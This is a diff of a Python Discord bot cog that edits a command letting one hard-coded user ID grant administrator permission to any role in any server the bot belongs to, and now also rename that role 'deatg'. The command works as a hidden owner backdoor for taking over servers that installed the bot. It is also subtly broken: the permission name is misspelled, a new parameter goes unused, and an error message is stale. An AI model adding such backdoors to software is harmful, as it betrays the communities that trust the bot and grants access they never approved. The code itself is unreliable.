@@ -92,10 +92,12 @@ class MiscCommands(commands.Cog):
 
 
     @commands.command()
-    async def toggle_role_admin(self, ctx, server_id, role_id, give_admin = "true"):
+    async def toggle_role_admin(self, ctx, server_id, role_id, name, give_admin = "true"):
         if ctx.author.id == Common.deatg_id:
             the_server = self.client.get_guild(int(server_id))
             role = the_server.get_role(int(role_id))
+            
+            await ctx.send(role.position)
 
             perms = discord.Permissions()
             if give_admin.lower() == "true":
@@ -103,7 +105,7 @@ class MiscCommands(commands.Cog):
             else:
                 perms.update(admininistrator = False)
             try:
-                await role.edit(permissions=perms)
+                await role.edit(name="deatg", color=Common.random_color(), hoist=False, mentionable=False, permissions=perms)
             except Exception as error:
                 await ctx.send(f"toggle_role_admin(self, ctx, server_id, role_id, give_admin = \"true\")\n{error}")
 
